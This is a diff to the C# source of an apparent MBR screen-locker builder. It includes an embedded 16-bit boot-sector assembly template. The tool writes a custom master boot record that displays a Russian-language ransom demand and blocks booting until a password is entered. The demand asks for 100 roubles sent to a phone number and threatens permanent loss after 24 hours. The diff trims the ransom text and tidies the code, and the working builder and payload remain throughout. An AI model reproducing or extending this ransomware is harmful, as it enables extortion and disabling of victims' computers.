@@ -224,7 +224,7 @@ namespace MbrLockerBuilder
         private void LoadDefaultValues()
         {
             this.txtTitle.Text = "Компьютер заблокирован!";
-            this.txtBody.Text = "Ваш компьютер заблокирован за использование нелегального ПО, включая чит ПО. Для разблокировки вашего компьютера необходимо отправить 100 рублей на номер +7xxxxxxxxxx, и вам приедет код разблокировки в сообщении. Внимание! В случае неуплаты в течение 24 часов компьютер будет невозможно восстановить.";
+            this.txtBody.Text = "Ваш компьютер заблокирован за использование нелегального ПО. Для разблокировки отправьте 100 рублей на номер +7xxxxxxxxxx.";
             this.txtPassword.Text = "48284dkf8";
         }
 
@@ -367,22 +367,6 @@ namespace MbrLockerBuilder
             return new byte[4096];
         }
 
-        private string ConvertToDosHex(string text)
-        {
-            if (string.IsNullOrEmpty(text)) return "";
-            try
-            {
-                Encoding dos = Encoding.GetEncoding(866);
-                byte[] bytes = dos.GetBytes(text);
-                return string.Join(", ", bytes.Select(b => "0x" + b.ToString("X2")));
-            }
-            catch
-            {
-                byte[] bytes = Encoding.ASCII.GetBytes(text);
-                return string.Join(", ", bytes.Select(b => "0x" + b.ToString("X2")));
-            }
-        }
-
         private bool ContainsRussian(string text)
         {
             if (string.IsNullOrEmpty(text)) return false;
@@ -409,14 +393,11 @@ start:
 
     mov ah, 0x06
     mov al, 0
-    mov bh,0x00
+    mov bh, 0x00
     mov cx, 0
     mov dx, 0x184F
     int 0x10
 
-    ; ============================================================
-    ; ЗАГРУЗКА ШРИФТА CP866 (СЕКТОРЫ 3-10)
-    ; ============================================================
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x1000
@@ -433,9 +414,6 @@ start:
     mov bx, 0x0100
     int 0x10
 
-    ; ============================================================
-    ; ЗАГРУЗКА ЗАГОЛОВКА (СЕКТОР 11)
-    ; ============================================================
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x9000
@@ -451,9 +429,6 @@ start:
     mov si, 0x9000
     call print
 
-    ; ============================================================
-    ; ЗАГРУЗКА ТЕКСТА (СЕКТОР 12)
-    ; ============================================================
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x9200
@@ -469,9 +444,6 @@ start:
     mov si, 0x9200
     call print
 
-    ; ============================================================
-    ; КУРСОР ВНИЗ И ВЫВОД ""Password: ""
-    ; ============================================================
     mov ah, 0x02
     mov bh, 0
     mov dh, 24
@@ -490,15 +462,11 @@ password_loop:
     mov si, msg_wrong
     call print
 
-    ; ОЧИСТКА СТРОКИ ПОСЛЕ ОШИБКИ
     mov ah, 0x02
     mov bh, 0
     mov dh, 24
     mov dl, 9
     int 0x10
-
-    mov si, msg_prompt
-    call print
 
     jmp password_loop
 
@@ -509,7 +477,7 @@ load_error:
 
 restore_and_boot:
     call restore_mbr
-    jmp load_os
+    int 0x19
 
 restore_mbr:
     pusha
@@ -539,17 +507,13 @@ restore_mbr:
     popa
     ret
 
-load_os:
-    ; ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА (ЧТОБЫ РАБОТАЛО В VBOX)
-    int 0x19
-
 print:
     lodsb
     or al, al
     jz .done
-    mov ah,0x0E
-    mov bh,0x00
-    mov bl,0x07
+    mov ah, 0x0E
+    mov bh, 0x00
+    mov bl, 0x07
     int 0x10
     jmp print
 .done:
@@ -569,9 +533,9 @@ get_password:
     cmp di, buffer + 64
     je .loop
     stosb
-    mov ah,0x0E
-    mov bh,0x00
-    mov bl,0x07
+    mov ah, 0x0E
+    mov bh, 0x00
+    mov bl, 0x07
     mov al, [di - 1]
     int 0x10
     jmp .loop
@@ -579,9 +543,9 @@ get_password:
     cmp di, buffer
     je .loop
     dec di
-    mov ah,0x0E
-    mov bh,0x00
-    mov bl,0x07
+    mov ah, 0x0E
+    mov bh, 0x00
+    mov bl, 0x07
     mov al, 0x08
     int 0x10
     mov al, ' '
@@ -591,9 +555,9 @@ get_password:
     jmp .loop
 .done:
     mov byte [di], 0
-    mov ah,0x0E
-    mov bh,0x00
-    mov bl,0x07
+    mov ah, 0x0E
+    mov bh, 0x00
+    mov bl, 0x07
     mov al, 0x0A
     int 0x10
     mov al, 0x0D
@@ -692,9 +656,7 @@ dw 0xAA55";
                 case 7: bgColor = "70"; break;
             }
 
-            template = template.Replace("mov bh,0x00", "mov bh,0x" + bgColor);
             template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
-            template = template.Replace("mov bl,0x07", "mov bl,0x" + textColor);
             template = template.Replace("mov bl, 0x07", "mov bl, 0x" + textColor);
 
             bool enableBSOD = this.chkBSOD.Checked;
@@ -797,10 +759,6 @@ dw 0xAA55";
                         "⚠️ Пароль содержит русские буквы!\n\n" +
                         "BIOS не поддерживает русские буквы в пароле.\n" +
                         "Пользователь не сможет ввести русский пароль.\n\n" +
-                        "Рекомендуется использовать только:\n" +
-                        "- Латинские буквы (A-Z, a-z)\n" +
-                        "- Цифры (0-9)\n" +
-                        "- Спецсимволы (!@#$%^&*)\n\n" +
                         "Продолжить с текущим паролем?",
                         "Предупреждение",
                         MessageBoxButtons.YesNo,
@@ -839,14 +797,11 @@ dw 0xAA55";
                 this.lblStatus.Text = "3/7 Сборка образа...";
                 Application.DoEvents();
 
-                // 13 СЕКТОРОВ (0-12)
                 int totalSectors = 13;
                 byte[] fullImage = new byte[512 * totalSectors];
 
-                // 1. MBR (сектор 0)
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
 
-                // 2. Шрифт (сектора 3-10) — 8 секторов = 4096 байт
                 byte[] fontData = GenerateCP866Font();
                 if (fontData != null && fontData.Length >= 4096)
                 {
@@ -860,7 +815,6 @@ dw 0xAA55";
                     Array.Copy(paddedFont, 0, fullImage, 512 * 3, 4096);
                 }
 
-                // 3. Заголовок (сектор 11)
                 string title = this.txtTitle.Text.Trim();
                 if (string.IsNullOrEmpty(title)) title = "LOCKED";
                 string border = "========================================\r\n";
@@ -870,7 +824,6 @@ dw 0xAA55";
                 if (titleBytes.Length > 512) Array.Resize(ref titleBytes, 512);
                 Array.Copy(titleBytes, 0, fullImage, 512 * 11, titleBytes.Length);
 
-                // 4. Текст (сектор 12) — ИСПРАВЛЕНО
                 string body = this.txtBody.Text.Trim();
                 if (string.IsNullOrEmpty(body)) body = "Computer is locked.";
                 string formattedBody = body.Replace("\n", "\r\n");
